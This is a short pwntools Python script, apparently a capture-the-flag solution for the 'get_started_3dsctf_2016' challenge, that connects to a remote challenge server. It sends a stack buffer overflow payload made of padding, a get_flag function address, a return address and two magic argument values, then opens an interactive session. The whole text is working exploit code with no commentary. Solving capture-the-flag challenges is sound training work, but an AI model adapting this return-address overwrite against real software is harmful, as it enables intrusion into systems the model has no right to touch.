from pwn import*

#p=process('./get_started_3dsctf_2016')
p = remote("node4.buuoj.cn",26837)
context.log_level = "debug"

getflag = 0x80489A0
getflag_ret = 0x804E6A0
a1 = 0x308CD64F
a2 = 0x195719D1

payload=b'a'*0x38 + p32(getflag) + p32(getflag_ret) + p32(a1) + p32(a2)
p.sendline(payload)
p.recv()

p.interactive()
